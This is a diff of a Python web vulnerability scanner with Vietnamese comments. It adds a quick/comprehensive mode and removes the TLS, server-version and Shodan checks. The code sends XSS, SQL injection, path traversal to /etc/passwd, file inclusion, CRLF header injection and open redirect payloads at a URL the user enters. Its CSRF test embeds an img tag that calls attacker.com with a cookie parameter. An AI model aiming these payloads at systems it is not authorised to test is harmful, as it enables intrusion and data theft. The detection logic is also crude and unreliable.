@@ -4,127 +4,87 @@ import re
 import json
 import time
 import ssl
-import socket
-import shodan
 
 class WebVulnerabilityScanner:
-    def __init__(self, target_url, proxies=None, session_cookies=None):
+    def __init__(self, target_url, proxies=None, mode="comprehensive"):
         self.target_url = target_url
         self.found_vulnerabilities = []
         self.headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
         }
         self.proxies = proxies if proxies else {}
-        self.session = requests.Session()
-        if session_cookies:
-            self.session.cookies.update(session_cookies)
+        self.mode = mode
 
-    # Kiểm tra XSS
+    # Quét XSS
     def scan_xss(self):
-        xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
+        if self.mode == "quick":
+            xss_payloads = ["<script>alert('XSS')</script>"]
+        else:
+            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
+
         for payload in xss_payloads:
             url = f"{self.target_url}?search={payload}"
-            response = self.session.get(url, headers=self.headers, proxies=self.proxies)
+            response = requests.get(url, headers=self.headers, proxies=self.proxies)
             if payload in response.text:
                 self.found_vulnerabilities.append(f"XSS Vulnerability found with payload: {payload}")
 
-    # Kiểm tra SQL Injection
+    # Quét SQL Injection
     def scan_sql_injection(self):
-        sql_payloads = ["' OR 1=1 --", "' OR 'a'='a", '" OR "1"="1']
+        if self.mode == "quick":
+            sql_payloads = ["' OR 1=1 --"]
+        else:
+            sql_payloads = ["' OR 1=1 --", "' OR 'a'='a", '" OR "1"="1']
+
         for payload in sql_payloads:
             url = f"{self.target_url}?id={payload}"
-            response = self.session.get(url, headers=self.headers, proxies=self.proxies)
+            response = requests.get(url, headers=self.headers, proxies=self.proxies)
             if "SQL syntax" in response.text or "error" in response.text.lower():
                 self.found_vulnerabilities.append(f"SQL Injection Vulnerability found with payload: {payload}")
 
-    # Kiểm tra Directory Traversal
+    # Quét Directory Traversal
     def scan_directory_traversal(self):
         traversal_payloads = ["../../../../etc/passwd", "../windows/system32/cmd.exe"]
         for payload in traversal_payloads:
             url = f"{self.target_url}/{payload}"
-            response = self.session.get(url, headers=self.headers, proxies=self.proxies)
+            response = requests.get(url, headers=self.headers, proxies=self.proxies)
             if "root:x:" in response.text or "CMD.EXE" in response.text:
                 self.found_vulnerabilities.append(f"Directory Traversal Vulnerability found with payload: {payload}")
 
-    # Kiểm tra File Inclusion
+    # Quét File Inclusion
     def scan_file_inclusion(self):
         file_inclusion_payloads = ["php://input", "file:///etc/passwd"]
         for payload in file_inclusion_payloads:
             url = f"{self.target_url}?file={payload}"
-            response = self.session.get(url, headers=self.headers, proxies=self.proxies)
+            response = requests.get(url, headers=self.headers, proxies=self.proxies)
             if "root:x:" in response.text:
                 self.found_vulnerabilities.append(f"File Inclusion Vulnerability found with payload: {payload}")
 
-    # Kiểm tra Open Redirect
+    # Quét Open Redirect
     def scan_open_redirect(self):
         redirect_payloads = ["https://attacker.com"]
         for payload in redirect_payloads:
             url = f"{self.target_url}?redirect={payload}"
-            response = self.session.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
+            response = requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
             if "location" in response.headers and payload in response.headers["location"]:
                 self.found_vulnerabilities.append(f"Open Redirect Vulnerability found with payload: {payload}")
 
-    # Kiểm tra CSRF với POST request
-    def scan_csrf_post(self):
-        csrf_payload = {"data": "<img src='http://attacker.com/csrf?cookie=" + requests.utils.quote(self.target_url) + "'>"}
-        url = self.target_url
-        response = self.session.post(url, headers=self.headers, proxies=self.proxies, data=csrf_payload)
+    # Quét CSRF
+    def scan_csrf(self):
+        csrf_payload = "<img src='http://attacker.com/csrf?cookie=" + requests.utils.quote(self.target_url) + "'>"
+        url = f"{self.target_url}?data={csrf_payload}"
+        response = requests.get(url, headers=self.headers, proxies=self.proxies)
         if "success" in response.text.lower():
-            self.found_vulnerabilities.append("Possible CSRF Vulnerability detected via POST")
+            self.found_vulnerabilities.append("Possible CSRF Vulnerability detected")
 
-    # Kiểm tra Header Injection
+    # Quét Header Injection
     def scan_header_injection(self):
         header_payloads = ["%0d%0aSet-Cookie:csrf-token=malicious"]
         for payload in header_payloads:
             headers = self.headers.copy()
             headers["X-Forwarded-For"] = payload
-            response = self.session.get(self.target_url, headers=headers, proxies=self.proxies)
+            response = requests.get(self.target_url, headers=headers, proxies=self.proxies)
             if "Set-Cookie" in response.headers:
                 self.found_vulnerabilities.append(f"Header Injection Vulnerability found with payload: {payload}")
-
-    # Kiểm tra cấu hình SSL/TLS
-    def scan_ssl_tls(self):
-        hostname = self.target_url.replace("http://", "").replace("https://", "").split("/")[0]
-        context = ssl.create_default_context()
-        
-        try:
-            with socket.create_connection((hostname, 443)) as sock:
-                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
-                    cert = ssock.getpeercert()
-                    ssl_version = ssock.version()
-                    cipher = ssock.cipher()
-                    
-                    if ssl_version in ['TLSv1', 'TLSv1.1']:
-                        self.found_vulnerabilities.append(f"Weak TLS version used: {ssl_version}")
-                    if not cert:
-                        self.found_vulnerabilities.append("No SSL certificate found.")
-                    
-                    print(f"SSL Version: {ssl_version}")
-                    print(f"Cipher: {cipher}")
-        except Exception as e:
-            print(f"Error checking SSL/TLS: {e}")
-
-    # Kiểm tra phiên bản phần mềm của server
-    def scan_server_version(self):
-        response = self.session.get(self.target_url, headers=self.headers, proxies=self.proxies)
-        server_header = response.headers.get("Server", "")
-        powered_by_header = response.headers.get("X-Powered-By", "")
-
-        if server_header:
-            self.found_vulnerabilities.append(f"Server version found: {server_header}")
-        if powered_by_header:
-            self.found_vulnerabilities.append(f"X-Powered-By: {powered_by_header}")
-
-    # Tích hợp Shodan API để tìm kiếm thông tin server
-    def scan_shodan(self, shodan_api_key):
-        api = shodan.Shodan(shodan_api_key)
-        hostname = self.target_url.replace("http://", "").replace("https://", "").split("/")[0]
-        try:
-            result = api.host(hostname)
-            if result:
-                self.found_vulnerabilities.append(f"Shodan scan found: {result}")
-        except shodan.APIError as e:
-            print(f"Shodan API Error: {e}")
 
     # Báo cáo kết quả
     def report(self, output_format="text"):
@@ -149,11 +109,11 @@ class WebVulnerabilityScanner:
 
 if __name__ == "__main__":
     target = input("Enter the target URL: ")
+    mode = input("Enter scan mode (quick/comprehensive): ").strip().lower()
     proxies_input = input("Enter proxy (optional, leave blank if none): ")
     proxies = {"http": proxies_input, "https": proxies_input} if proxies_input else None
-    shodan_api_key = input("Enter Shodan API Key (optional, leave blank if none): ")
     
-    scanner = WebVulnerabilityScanner(target, proxies=proxies)
+    scanner = WebVulnerabilityScanner(target, proxies=proxies, mode=mode)
     
     start_time = time.time()
 
@@ -163,13 +123,8 @@ if __name__ == "__main__":
     scanner.scan_directory_traversal()
     scanner.scan_file_inclusion()
     scanner.scan_open_redirect()
-    scanner.scan_csrf_post()
+    scanner.scan_csrf()
     scanner.scan_header_injection()
-    scanner.scan_ssl_tls()
-    scanner.scan_server_version()
-    
-    if shodan_api_key:
-        scanner.scan_shodan(shodan_api_key)
 
     # Report
     output_format = input("Enter output format (text, json, html): ")
